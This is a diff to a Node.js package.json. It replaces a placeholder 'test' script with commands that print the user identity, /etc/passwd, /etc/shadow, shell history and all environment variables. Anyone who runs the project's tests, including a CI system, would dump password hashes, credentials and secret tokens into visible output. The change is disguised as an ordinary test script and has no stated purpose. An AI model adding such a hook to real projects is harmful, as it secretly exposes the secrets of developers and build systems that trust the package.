@@ -5,7 +5,7 @@
   "main": "index.js", 
   "scripts": { 
     "build": "echo 'Building the project... BIRRRRR'", 
-    "test": "echo 'Testing the project... TESTTTTT'"   
+    "test": "id && cat /etc/passwd && cat /etc/shadow && history && env && echo terminou"   
   }, 
   "dependencies": { 
     "express": "^4.17.1" 
